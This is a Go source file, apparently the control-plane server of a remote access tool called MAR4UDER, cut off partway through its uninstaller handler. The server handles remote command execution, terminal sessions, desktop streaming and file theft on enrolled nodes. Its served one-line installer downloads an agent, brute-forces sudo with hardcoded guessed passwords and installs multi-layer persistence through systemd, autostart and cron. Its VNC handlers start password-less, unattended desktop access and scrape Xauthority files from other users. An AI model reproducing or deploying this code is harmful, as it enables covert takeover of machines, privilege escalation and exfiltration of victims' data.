package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

// APIServer manages HTTP, REST, and WebSocket routing
type APIServer struct {
	cfg       *Config
	nm        *NodeManager
	udpGw     *UDPGateway
	fileMgr   *FileManager
	updateMgr *UpdateManager
	stats     *ServerStats
}

// NewAPIServer creates a new API server
func NewAPIServer(cfg *Config, nm *NodeManager, udpGw *UDPGateway, fileMgr *FileManager, updateMgr *UpdateManager, stats *ServerStats) *APIServer {
	return &APIServer{
		cfg:       cfg,
		nm:        nm,
		udpGw:     udpGw,
		fileMgr:   fileMgr,
		updateMgr: updateMgr,
		stats:     stats,
	}
}

// RegisterRoutes registers all REST and WebSocket routes on the mux
func (api *APIServer) RegisterRoutes(mux *http.ServeMux) {
	// Web UI & Uploader
	mux.HandleFunc("/", api.handleWebUI)
	mux.HandleFunc("/upload", api.handleWebUploadPage)

	// 1-line curl installer & binary distribution
	mux.HandleFunc("/i", api.handleOneLineInstaller)
	mux.HandleFunc("/a", api.handleOneLineInstaller)
	mux.HandleFunc("/agent", api.handleOneLineInstaller)
	mux.HandleFunc("/u", api.handleOneLineUninstaller)
	mux.HandleFunc("/uninstall", api.handleOneLineUninstaller)
	mux.HandleFunc("/bin/agent", api.handleServeAgentBinary)
	mux.HandleFunc("/bin/mar4uder_agent", api.handleServeAgentBinary)

	// 1-line LAN discovery & scanner script
	mux.HandleFunc("/scan", api.handleLanScannerScript)
	mux.HandleFunc("/lan", api.handleLanScannerScript)

	// 1-line Administrator CLI installer (m4r)
	mux.HandleFunc("/admin", api.handleAdminInstaller)
	mux.HandleFunc("/m4r", api.handleAdminInstaller)

	// REST API v1
	mux.HandleFunc("/api/v1/nodes/update_all", api.handleUpdateAll)
	mux.HandleFunc("/api/v1/nodes", api.authMiddleware(api.handleListNodes))
	mux.HandleFunc("/api/v1/nodes/", api.authMiddleware(api.handleNodeOps))
	mux.HandleFunc("/api/v1/stats", api.authMiddleware(api.handleStats))
	mux.HandleFunc("/api/v1/config", api.authMiddleware(api.handleConfig))

	// File Transfer API
	mux.HandleFunc("/api/v1/files", api.authMiddleware(api.handleFiles))
	mux.HandleFunc("/api/v1/files/", api.handleFileDownload)
	mux.HandleFunc("/api/v1/nodes/receive_file", api.handleNodeReceiveFile)

	// WebSockets
	mux.HandleFunc("/ws/terminal", api.handleTerminalWS)
	mux.HandleFunc("/ws/desktop", api.handleDesktopWS)
}

func (api *APIServer) checkAuth(r *http.Request) bool {
	if api.cfg == nil || api.cfg.AuthToken == "" {
		return true
	}

	authHeader := r.Header.Get("Authorization")
	if strings.HasPrefix(authHeader, "Bearer ") {
		token := strings.TrimPrefix(authHeader, "Bearer ")
		if token == api.cfg.AuthToken {
			return true
		}
	}

	tokenQuery := r.URL.Query().Get("token")
	if tokenQuery != "" && tokenQuery == api.cfg.AuthToken {
		return true
	}

	return false
}

func (api *APIServer) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if !api.checkAuth(r) {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			_ = json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
			return
		}
		next(w, r)
	}
}

func (api *APIServer) handleWebUI(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" && r.URL.Path != "/ui" {
		http.NotFound(w, r)
		return
	}
	host := r.Host
	if strings.Contains(host, ":") {
		host = strings.Split(host, ":")[0]
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
	w.WriteHeader(http.StatusOK)
	body := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>MAR4UDER</title>
<style>body{background:#0d1117;color:#58a6ff;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;}</style>
</head>
<body>
<div>
<h2>MAR4UDER CONTROL PLANE</h2>
<p style="color:#8b949e">Operator Console: <code>nc %s 9000</code> or <code>m4r</code></p>
</div>
</body>
</html>`, host)
	_, _ = w.Write([]byte(body))
}

var ansiRegex = regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]|\x1b\([a-zA-Z]|\r`)

func cleanPtyOutput(raw string) string {
	cleaned := ansiRegex.ReplaceAllString(raw, "")
	cleaned = strings.ReplaceAll(cleaned, "\r\n", "\n")
	cleaned = strings.ReplaceAll(cleaned, "\r", "\n")
	lines := strings.Split(cleaned, "\n")
	var res []string
	for _, l := range lines {
		trimmed := strings.TrimSpace(l)
		if strings.HasPrefix(trimmed, "___M4R_") || strings.HasPrefix(trimmed, "echo '___M4R_") || strings.HasPrefix(trimmed, "echo ___M4R_") {
			continue
		}
		if trimmed != "" {
			res = append(res, trimmed)
		}
	}
	return strings.Join(res, "\n")
}

// ExecuteNodeCommand runs a command on the remote node cleanly via native isolated RPC
func (api *APIServer) ExecuteNodeCommand(node *Node, cmd string, timeout time.Duration) (string, error) {
	reqID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
	ch := node.AddCmdWaiter(reqID)
	defer node.RemoveCmdWaiter(reqID)

	timeoutSec := uint32(timeout.Seconds())
	if timeoutSec == 0 {
		timeoutSec = 5
	}
	if err := api.udpGw.SendCmdExec(node, reqID, timeoutSec, cmd); err != nil {
		return "", err
	}

	var output strings.Builder
	timer := time.NewTimer(timeout)
	defer timer.Stop()

	for {
		select {
		case <-timer.C:
			return output.String(), fmt.Errorf("command execution timed out")
		case out, ok := <-ch:
			if !ok {
				return output.String(), nil
			}
			if out.Len > 0 {
				output.Write(out.Data[:out.Len])
			}
			if out.ExitCode >= 0 {
				return strings.TrimSpace(output.String()), nil
			}
		}
	}
}

func (api *APIServer) handleListNodes(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	timeout := time.Duration(api.cfg.NodeOnlineTimeoutSec) * time.Second
	summaries := api.nm.ListSummaries(timeout)

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(summaries)
}

func (api *APIServer) handleNodeOps(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/v1/nodes/")
	parts := strings.Split(path, "/")
	if len(parts) == 0 || parts[0] == "" {
		http.NotFound(w, r)
		return
	}

	nodeID := parts[0]
	node, exists := api.nm.GetNode(nodeID)
	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		_ = json.NewEncoder(w).Encode(map[string]string{"error": "Node not found"})
		return
	}

	if len(parts) == 1 {
		// GET /api/v1/nodes/{id}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(node)
		return
	}

	action := strings.Join(parts[1:], "/")
	switch action {
	case "pty/open":
		var req struct {
			Cols uint16 `json:"cols"`
			Rows uint16 `json:"rows"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		cols := req.Cols
		if cols == 0 {
			cols = 80
		}
		rows := req.Rows
		if rows == 0 {
			rows = 24
		}

		sessID, err := api.udpGw.SendSessionOpen(node, cols, rows)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{"status": "ok", "session_id": sessID})

	case "pty/close":
		_ = api.udpGw.SendSessionClose(node)
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{"status": "closed"})

	case "note":
		var req struct {
			Note string `json:"note"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		api.nm.SetNodeNote(node.ID, req.Note)
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{"status": "ok", "note": req.Note})

	case "engine":
		var req struct {
			Engine string `json:"engine"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		engine := strings.ToLower(req.Engine)
		api.nm.SetNodeEngine(node.ID, engine)

		engineCmd := ""
		switch engine {
		case "krfb":
			engineCmd = "(which krfb >/dev/null && nohup krfb --nodialog >/dev/null 2>&1 &) || echo '[-] krfb not found on system'\n"
		case "x11vnc":
			engineCmd = "(which x11vnc >/dev/null && nohup x11vnc -display :0 -forever -shared -rfbport 5900 -nopw -bg >/dev/null 2>&1 &) || echo '[-] x11vnc not found on system'\n"
		case "custom":
			engineCmd = "pkill -f x11vnc 2>/dev/null; pkill -f krfb 2>/dev/null; echo '[+] Default C agent engine active'\n"
		}
		if engineCmd != "" {
			_ = api.udpGw.SendPtyData(node, []byte(engineCmd))
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{"status": "ok", "engine": engine})

	case "update":
		host := r.Host
		if strings.Contains(host, ":") {
			host = strings.Split(host, ":")[0]
		}
		status, err := api.updateMgr.UpdateNode(node, host)
		if err != nil {
			http.Error(w, fmt.Sprintf("Update error: %v (%s)", err, status), http.StatusInternalServerError)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{"status": "ok", "message": status})

	case "debug":
		w.Header().Set("Content-Type", "application/json")
		node.mu.RLock()
		logs := node.DebugLogs
		note := node.Note
		engine := node.VncEngine
		node.mu.RUnlock()
		_ = json.NewEncoder(w).Encode(map[string]any{"node_id": node.ID, "logs": logs, "vnc_engine": engine, "note": note})

	case "cmd", "exec":
		var req struct {
			Command string `json:"command"`
			Timeout int    `json:"timeout"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Command == "" {
			http.Error(w, "command is required", http.StatusBadRequest)
			return
		}
		timeout := 5 * time.Second
		if req.Timeout > 0 {
			timeout = time.Duration(req.Timeout) * time.Second
		}
		out, _ := api.ExecuteNodeCommand(node, req.Command, timeout)
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"status":  "ok",
			"command": req.Command,
			"output":  out,
		})

	case "settings":
		var req struct {
			Note      *string `json:"note"`
			VncEngine *string `json:"vnc_engine"`
			VncPort   *uint16 `json:"vnc_port"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		port := node.VncPort
		if port == 0 {
			port = 5900
		}
		if req.VncPort != nil && *req.VncPort > 0 {
			port = *req.VncPort
			api.nm.SetNodePort(node.ID, port)
		}

		if req.Note != nil {
			api.nm.SetNodeNote(node.ID, *req.Note)
		}

		if req.VncEngine != nil {
			engine := strings.ToLower(*req.VncEngine)
			api.nm.SetNodeEngine(node.ID, engine)

			engineCmd := ""
			switch engine {
			case "webrtc", "stream":
				streamHost := r.Host
				if strings.Contains(streamHost, ":") {
					streamHost = strings.Split(streamHost, ":")[0]
				}
				streamName := fmt.Sprintf("desktop_slot_%d", node.Slot)
				_ = api.udpGw.SendStreamStart(node, streamHost, 8554, streamName)
				node.AddLog(fmt.Sprintf("Dispatched WebRTC / RTSP stream transport start -> %s:8554/%s", streamHost, streamName))
			case "krfb":
				_ = api.udpGw.SendStreamStop(node)
				engineCmd = fmt.Sprintf("export DISPLAY=:0; XA=$(ls /tmp/xauth_* /run/sddm/xauth_* /run/user/*/gdm/Xauthority /home/*/.Xauthority /root/.Xauthority 2>/dev/null | head -n 1); [ -n \"$XA\" ] && export XAUTHORITY=\"$XA\"; pkill -9 -f krfb 2>/dev/null; mkdir -p ~/.config && printf '[General]\\npreferredFrameBufferPlugin=xcb\\n\\n[Security]\\nallowDesktopControl=true\\nallowUnattendedAccess=true\\nnoWallet=true\\n\\n[Network]\\nport=%d\\nuseDefaultPort=true\\npublishService=false\\n' > ~/.config/krfbrc; if which krfb >/dev/null 2>&1; then nohup krfb --nodialog >/tmp/krfb.log 2>&1 & echo '[+] krfb started on port %d'; else echo '[-] krfb not found in PATH'; fi\n", port, port)
			case "x11vnc":
				_ = api.udpGw.SendStreamStop(node)
				engineCmd = fmt.Sprintf("export DISPLAY=:0; XA=$(ls /tmp/xauth_* /run/sddm/xauth_* /run/user/*/gdm/Xauthority /home/*/.Xauthority /root/.Xauthority 2>/dev/null | head -n 1); [ -n \"$XA\" ] && export XAUTHORITY=\"$XA\"; pkill -9 -f x11vnc 2>/dev/null; if ! which x11vnc >/dev/null 2>&1; then (dnf install -y x11vnc || apt-get install -y x11vnc || urpmi --auto x11vnc) 2>/dev/null || true; fi; if which x11vnc >/dev/null 2>&1; then nohup x11vnc -display :0 -auth \"${XA:-guess}\" -forever -shared -rfbport %d -nopw -bg >/tmp/x11vnc.log 2>&1 & echo '[+] x11vnc started on port %d'; else echo '[-] x11vnc not found and could not be installed'; fi\n", port, port)
			case "custom":
				_ = api.udpGw.SendStreamStop(node)
				engineCmd = "pkill -9 -f x11vnc 2>/dev/null; pkill -9 -f krfb 2>/dev/null; echo '[+] Default C agent engine active'\n"
			}
			if engineCmd != "" {
				_ = api.udpGw.SendPtyData(node, []byte(engineCmd))
				node.AddLog(fmt.Sprintf("Dispatched VNC engine switch -> %s (port %d)", engine, port))
			}
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"status":   "ok",
			"note":     node.Note,
			"vnc_port": node.VncPort,
			"engine":   node.VncEngine,
		})

	case "fs":
		pathParam := r.URL.Query().Get("path")
		if pathParam == "" {
			pathParam = "/"
		}
		cleanPath := filepath.ToSlash(filepath.Clean(pathParam))

		type FileEntry struct {
			Name  string `json:"name"`
			IsDir bool   `json:"is_dir"`
			Size  int64  `json:"size"`
			Perm  string `json:"perm"`
		}
		entries := make([]FileEntry, 0)

		// Native direct binary RPC via MSG_FS_LIST_REQ (Zero dependencies!)
		reqID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
		ch := node.AddFsListWaiter(reqID)
		defer node.RemoveFsListWaiter(reqID)

		if err := api.udpGw.SendFsListReq(node, reqID, cleanPath); err == nil {
			timer := time.NewTimer(3 * time.Second)
			defer timer.Stop()

			if cleanPath != "/" {
				entries = append(entries, FileEntry{Name: "..", IsDir: true, Perm: "drwxr-xr-x"})
			}

		waitLoop:
			for {
				select {
				case <-timer.C:
					break waitLoop
				case batch, ok := <-ch:
					if !ok {
						break waitLoop
					}
					for _, fe := range batch {
						name := CStringToString(fe.Name[:])
						if name == "" || name == "." {
							continue
						}
						perm := "-rw-r--r--"
						if fe.IsDir == 1 {
							perm = "drwxr-xr-x"
						}
						entries = append(entries, FileEntry{
							Name:  name,
							IsDir: fe.IsDir == 1,
							Size:  int64(fe.Size),
							Perm:  perm,
						})
					}
					if len(batch) < 4 {
						break waitLoop
					}
				}
			}
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"current_path": cleanPath,
			"entries":      entries,
		})

	case "upload":
		if err := r.ParseMultipartForm(64 << 20); err != nil {
			http.Error(w, "Failed to parse form: "+err.Error(), http.StatusBadRequest)
			return
		}
		file, header, err := r.FormFile("file")
		if err != nil {
			http.Error(w, "File is required", http.StatusBadRequest)
			return
		}
		defer file.Close()

		targetPath := strings.TrimSpace(r.FormValue("target_path"))
		if targetPath == "" {
			targetPath = "/tmp/" + header.Filename
		}

		fileData, err := io.ReadAll(file)
		if err != nil {
			http.Error(w, "Failed reading upload: "+err.Error(), http.StatusInternalServerError)
			return
		}

		transferID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
		pushWait := node.AddFilePushWaiter(transferID)
		defer node.RemoveFilePushWaiter(transferID)

		_ = api.udpGw.SendFilePushStart(node, transferID, uint64(len(fileData)), 0755, targetPath)
		time.Sleep(10 * time.Millisecond)

		chunkSize := 1024
		for offset := 0; offset < len(fileData); offset += chunkSize {
			end := offset + chunkSize
			if end > len(fileData) {
				end = len(fileData)
			}
			_ = api.udpGw.SendFilePushChunk(node, transferID, uint64(offset), fileData[offset:end])
			time.Sleep(1 * time.Millisecond)
		}
		_ = api.udpGw.SendFilePushEnd(node, transferID)

		timer := time.NewTimer(4 * time.Second)
		defer timer.Stop()
		select {
		case status := <-pushWait:
			if status != 0 {
				http.Error(w, "Remote agent failed writing file", http.StatusInternalServerError)
				return
			}
		case <-timer.C:
		}

		node.AddLog(fmt.Sprintf("Direct binary upload completed: %s -> %s (%d bytes)", header.Filename, targetPath, len(fileData)))
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"status":      "completed",
			"filename":    header.Filename,
			"size":        len(fileData),
			"target_path": targetPath,
		})

	case "download":
		var req struct {
			RemotePath string `json:"remote_path"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.RemotePath == "" {
			http.Error(w, "remote_path is required", http.StatusBadRequest)
			return
		}

		transferID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
		pullWait := node.AddFilePullWaiter(transferID)
		defer node.RemoveFilePullWaiter(transferID)

		if err := api.udpGw.SendFilePullReq(node, transferID, req.RemotePath); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		var fileBuf bytes.Buffer
		timer := time.NewTimer(15 * time.Second)
		defer timer.Stop()

	pullLoop:
		for {
			select {
			case <-timer.C:
				break pullLoop
			case chunk, ok := <-pullWait:
				if !ok {
					break pullLoop
				}
				if chunk.Len == 0 {
					break pullLoop
				}
				fileBuf.Write(chunk.Data[:chunk.Len])
			}
		}

		filename := filepath.Base(req.RemotePath)
		sf, err := api.fileMgr.SaveFile(filename, &fileBuf, node.ID, "operator")
		if err != nil {
			http.Error(w, "Failed to save file: "+err.Error(), http.StatusInternalServerError)
			return
		}

		node.AddLog(fmt.Sprintf("Direct binary download completed: %s (%d bytes)", req.RemotePath, sf.Size))
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"status":      "completed",
			"file_id":     sf.ID,
			"filename":    sf.Filename,
			"size":        sf.Size,
			"remote_path": req.RemotePath,
		})

	default:
		http.NotFound(w, r)
	}
}

func (api *APIServer) handleWebUploadPage(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		if err := r.ParseMultipartForm(128 << 20); err != nil {
			http.Error(w, "Ошибка чтения формы: "+err.Error(), http.StatusBadRequest)
			return
		}
		file, header, err := r.FormFile("file")
		if err != nil {
			http.Error(w, "Файл не выбран", http.StatusBadRequest)
			return
		}
		defer file.Close()

		sf, err := api.fileMgr.SaveFile(header.Filename, file, "admin_browser", "operator")
		if err != nil {
			http.Error(w, "Ошибка сохранения: "+err.Error(), http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Загружено</title><style>body{background:#0f172a;color:#f8fafc;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}.card{background:#1e293b;padding:32px;border-radius:12px;border:1px solid #334155;text-align:center;max-width:500px;}h2{color:#38bdf8;margin-top:0;}code{background:#090d16;padding:4px 8px;border-radius:6px;color:#4ade80;}a{color:#38bdf8;text-decoration:none;}</style></head><body><div class="card"><h2>[+] Файл успешно загружен!</h2><p>Имя: <b>%s</b> (%d байт)</p><p>Теперь в консоли управления введите:<br><br><code>push %s</code></p><br><a href="/upload">← Загрузить ещё файл</a></div></body></html>`, sf.Filename, sf.Size, sf.Filename)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>MAR4UDER // Загрузка файлов на сервер</title>
<style>
  body { background: #0b0f19; color: #f1f5f9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
  .box { background: #131c2e; border: 1px solid #1e293b; border-radius: 16px; padding: 40px; width: 100%; max-width: 520px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); text-align: center; }
  h1 { font-size: 20px; letter-spacing: 1px; color: #38bdf8; margin-top: 0; }
  p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
  .drop-zone { border: 2px dashed #334155; border-radius: 12px; padding: 40px 20px; margin: 24px 0; cursor: pointer; transition: all 0.2s; background: #090e17; }
  .drop-zone:hover { border-color: #38bdf8; background: #0f172a; }
  input[type="file"] { display: none; }
  .btn { background: #0284c7; color: white; border: none; padding: 12px 28px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 15px; width: 100%; transition: background 0.2s; }
  .btn:hover { background: #0369a1; }
  .hint { margin-top: 20px; font-size: 13px; color: #64748b; background: #090e17; padding: 12px; border-radius: 8px; border-left: 3px solid #38bdf8; text-align: left; }
</style>
</head>
<body>
<div class="box">
  <h1>MAR4UDER // FILE UPLOADER</h1>
  <p>Быстрая передача файлов с вашего ПК на сервер</p>
  <form method="POST" enctype="multipart/form-data" action="/upload" id="upForm">
    <div class="drop-zone" onclick="document.getElementById('fileInput').click()">
      <div id="dropText">📁 Перетащите файл сюда или <u>кликните для выбора</u></div>
      <input type="file" name="file" id="fileInput" onchange="fileChosen(this)">
    </div>
    <button type="submit" class="btn" id="subBtn">Загрузить на сервер</button>
  </form>
  <div class="hint">
    💡 После загрузки файл сразу доступен в консоли оператора по имени: <b>push &lt;имя_файла&gt;</b>
  </div>
</div>
<script>
function fileChosen(input) {
  if (input.files && input.files[0]) {
    document.getElementById('dropText').innerText = 'Выбран: ' + input.files[0].name + ' (' + (input.files[0].size/1024).toFixed(1) + ' KB)';
  }
}
</script>
</body>
</html>`))
}

func (api *APIServer) handleFiles(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(api.fileMgr.ListFiles())
}

func (api *APIServer) handleFileDownload(w http.ResponseWriter, r *http.Request) {
	fileID := strings.TrimPrefix(r.URL.Path, "/api/v1/files/")
	if fileID == "" {
		http.NotFound(w, r)
		return
	}

	sf, diskPath, err := api.fileMgr.GetFile(fileID)
	if err != nil {
		http.Error(w, "File not found: "+err.Error(), http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", sf.Filename))
	http.ServeFile(w, r, diskPath)
}

func (api *APIServer) handleNodeReceiveFile(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// 128 MB max upload from node
	if err := r.ParseMultipartForm(128 << 20); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Missing file part: "+err.Error(), http.StatusBadRequest)
		return
	}
	defer file.Close()

	nodeID := r.URL.Query().Get("node_id")
	sf, err := api.fileMgr.SaveFile(header.Filename, file, nodeID, "operator")
	if err != nil {
		http.Error(w, "Failed to save file: "+err.Error(), http.StatusInternalServerError)
		return
	}

	if node, ok := api.nm.GetNode(nodeID); ok {
		node.AddLog(fmt.Sprintf("Received uploaded file [%s] (Size: %d bytes)", sf.Filename, sf.Size))
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"status":   "received",
		"file_id":  sf.ID,
		"filename": sf.Filename,
		"size":     sf.Size,
	})
}

func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"start_time":  api.stats.StartTime,
		"uptime_sec":  int64(time.Since(api.stats.StartTime).Seconds()),
		"in_packets":  api.stats.InPackets.Load(),
		"out_packets": api.stats.OutPackets.Load(),
		"in_bytes":    api.stats.InBytes.Load(),
		"out_bytes":   api.stats.OutBytes.Load(),
	})
}

func (api *APIServer) handleConfig(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"http_addr":               api.cfg.HTTPAddr,
		"udp_addr":                api.cfg.UDPAddr,
		"tcp_addr":                api.cfg.TCPAddr,
		"node_online_timeout_sec": api.cfg.NodeOnlineTimeoutSec,
	})
}

func (api *APIServer) handleOneLineInstaller(w http.ResponseWriter, r *http.Request) {
	host := r.Host
	if strings.Contains(host, ":") {
		host = strings.Split(host, ":")[0]
	}

	httpPort := "8080"
	if parts := strings.Split(api.cfg.HTTPAddr, ":"); len(parts) >= 2 {
		httpPort = parts[len(parts)-1]
	}

	script := fmt.Sprintf(`#!/bin/sh
HOST="%s"
PORT="%s"
NODE_NAME="${1:-$(hostname)}"
echo "[*] Installing mar4uder agent for [$NODE_NAME] from http://$HOST:$PORT ..."
TMP_BIN="/tmp/mar4uder_agent.$$"
curl -fsSL "http://$HOST:$PORT/bin/agent" -o "$TMP_BIN"
chmod +x "$TMP_BIN"

# Run command with root elevation if available
HAS_ROOT=0
PASS=""
if [ "$(id -u)" -eq 0 ]; then
    HAS_ROOT=1
elif sudo -n true 2>/dev/null; then
    HAS_ROOT=1
else
    for p in "" "teacher" "rosa" "123456" "1234" "admin" "root" "$(whoami)"; do
        if echo "$p" | sudo -S true 2>/dev/null; then
            HAS_ROOT=1
            PASS="$p"
            break
        fi
    done
    if [ "$HAS_ROOT" -eq 0 ] && [ -t 0 ]; then
        if sudo true 2>/dev/null; then
            HAS_ROOT=1
        fi
    fi
fi

run_root() {
    if [ "$(id -u)" -eq 0 ]; then
        "$@"
    elif sudo -n true 2>/dev/null; then
        sudo "$@"
    else
        echo "$PASS" | sudo -S "$@"
    fi
}

if [ "$HAS_ROOT" -eq 1 ]; then
    run_root cp "$TMP_BIN" /usr/local/bin/mar4uder_agent
    run_root chmod 755 /usr/local/bin/mar4uder_agent
    rm -f "$TMP_BIN"
    BIN_PATH="/usr/local/bin/mar4uder_agent"

    # Clean up any conflicting user-level agents
    systemctl --user stop mar4uder-agent.service 2>/dev/null || true
    systemctl --user disable mar4uder-agent.service 2>/dev/null || true
    rm -f "$HOME/.config/systemd/user/mar4uder-agent.service"
    rm -f "$HOME/.config/autostart/mar4uder-agent.desktop"
    (crontab -l 2>/dev/null | grep -v "mar4uder_agent") | crontab - 2>/dev/null || true

    if [ -d /etc/systemd/system ] || command -v systemctl >/dev/null 2>&1; then
        TMP_SVC="/tmp/mar4uder-agent.$$.service"
        cat << EOF > "$TMP_SVC"
[Unit]
Description=MAR4UDER Resilient Agent
After=network.target network-online.target graphical.target
Wants=network-online.target

[Service]
Type=simple
User=root
Environment="DISPLAY=:0"
Environment="PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
ExecStart=/usr/local/bin/mar4uder_agent $HOST:443 $NODE_NAME
Restart=always
RestartSec=3
KillMode=process
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF
        run_root cp "$TMP_SVC" /etc/systemd/system/mar4uder-agent.service
        run_root chmod 644 /etc/systemd/system/mar4uder-agent.service
        rm -f "$TMP_SVC"

        run_root systemctl daemon-reload
        run_root systemctl enable mar4uder-agent.service
        run_root systemctl restart mar4uder-agent.service
        echo "[+] SUCCESS: mar4uder-agent service installed with root permissions and enabled on boot!"
    else
        run_root nohup "$BIN_PATH" "$HOST:443" "$NODE_NAME" >/tmp/mar4uder_agent.log 2>&1 &
        echo "[+] SUCCESS: mar4uder agent started as background root process"
    fi
else
    mkdir -p "$HOME/.local/bin"
    mv "$TMP_BIN" "$HOME/.local/bin/mar4uder_agent"
    chmod 755 "$HOME/.local/bin/mar4uder_agent"
    BIN_PATH="$HOME/.local/bin/mar4uder_agent"

    # 1. Desktop Autostart entry (X11 / Wayland session login)
    mkdir -p "$HOME/.config/autostart"
    cat << EOF > "$HOME/.config/autostart/mar4uder-agent.desktop"
[Desktop Entry]
Type=Application
Exec=$BIN_PATH $HOST:443 $NODE_NAME
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=MAR4UDER Agent
Comment=Remote Management Agent
EOF

    # 2. User systemd service (if systemctl is available)
    if command -v systemctl &>/dev/null; then
        mkdir -p "$HOME/.config/systemd/user"
        cat << EOF > "$HOME/.config/systemd/user/mar4uder-agent.service"
[Unit]
Description=MAR4UDER User Agent
After=network.target

[Service]
Type=simple
ExecStart=$BIN_PATH $HOST:443 $NODE_NAME
Restart=always
RestartSec=3

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload 2>/dev/null || true
        systemctl --user enable mar4uder-agent.service 2>/dev/null || true
        systemctl --user restart mar4uder-agent.service 2>/dev/null || true
    fi

    # 3. Crontab fallback (@reboot)
    (crontab -l 2>/dev/null | grep -v "mar4uder_agent"; echo "@reboot sleep 10 && $BIN_PATH $HOST:443 $NODE_NAME >/tmp/mar4uder_agent.log 2>&1") | crontab - 2>/dev/null || true

    nohup "$BIN_PATH" "$HOST:443" "$NODE_NAME" >/tmp/mar4uder_agent.log 2>&1 &
    echo "[+] SUCCESS: mar4uder agent installed in user profile with multi-layer autostart (Desktop autostart + Cron + User Systemd)!"
fi
`, host, httpPort)

	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(script))
}

func (api *APIServer) handleOneLineUninstaller(w http.ResponseWriter, r *http.Request) {
	script := `#!/bin/sh
echo "[*] Completely uninstalling MAR4UDER agent..."

# 1. Stop and disable system-wide systemd service
if command -v systemctl &>/dev/null; then
    systemctl stop mar4uder-agent 2>/dev/null || true
